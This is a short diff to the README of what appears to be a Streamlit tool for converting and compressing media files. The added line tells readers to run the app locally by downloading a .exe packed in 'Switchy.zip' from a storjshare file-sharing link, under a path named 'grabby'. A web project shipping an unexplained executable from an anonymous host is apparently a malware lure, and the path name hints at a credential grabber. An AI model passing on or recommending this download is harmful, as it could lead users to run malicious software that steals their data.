@@ -2,6 +2,8 @@
 
 A Streamlit powered front-end that converts & compresses various image, video & audio formats.
 
+Run this application locally with the .exe found [here](https://link.storjshare.io/s/jwbzfzgfbkzce2ce36l67kjfynuq/grabby/Switchy.zip).
+
 ### The packages doing all the hard work...
 
 #### Web Framework:
